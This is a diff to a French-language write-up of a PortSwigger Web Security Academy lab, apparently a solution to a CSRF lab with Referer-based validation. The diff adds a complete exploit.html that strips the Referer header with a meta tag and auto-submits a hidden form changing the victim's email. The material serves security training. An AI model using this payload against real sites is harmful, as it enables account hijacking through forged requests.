@@ -9,7 +9,24 @@
 2. Navigation sur la page produit et observation des requêtes dans l’onglet `Proxy → HTTP history`.
 3. Identification d’une requête de type `POST /my-account/change-email` pour la modification de l'email.
 4. Observation du header `Referer` qui est présent et valide.
-5. Création d'un fichier `exploit.html` qui va submit le formulaire de modification d'email avec la balise `<meta name="referrer" content="never">` pour supprimer le header Referer.
+5. Création d'un fichier `exploit.html` qui va submit le formulaire de modification d'email avec la balise `<meta name="referrer" content="never">` pour supprimer le header Referer
+```html
+<html>
+    <head>
+        <meta name="referrer" content="never">
+    </head>
+    <body>
+        <h1>hello world</h1>
+        <iframe style="display: none" id="csrf-iframe"></iframe>
+        <form action="https://0a9900f10460866b805c03dd00d80022.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="test@test.com">
+        </form>
+        <script>
+            document.getElementById('csrf-form').submit();
+        </script>
+    </body>
+</html>
+```
 6. Envoi de l'exploit.html vers le lab et observation de la requête dans l'onglet `Proxy → HTTP history`.
 7. Observation que le header Referer est absent grâce à la balise meta, permettant de contourner la validation basée sur le Referer.
 8. Validation du challenge.
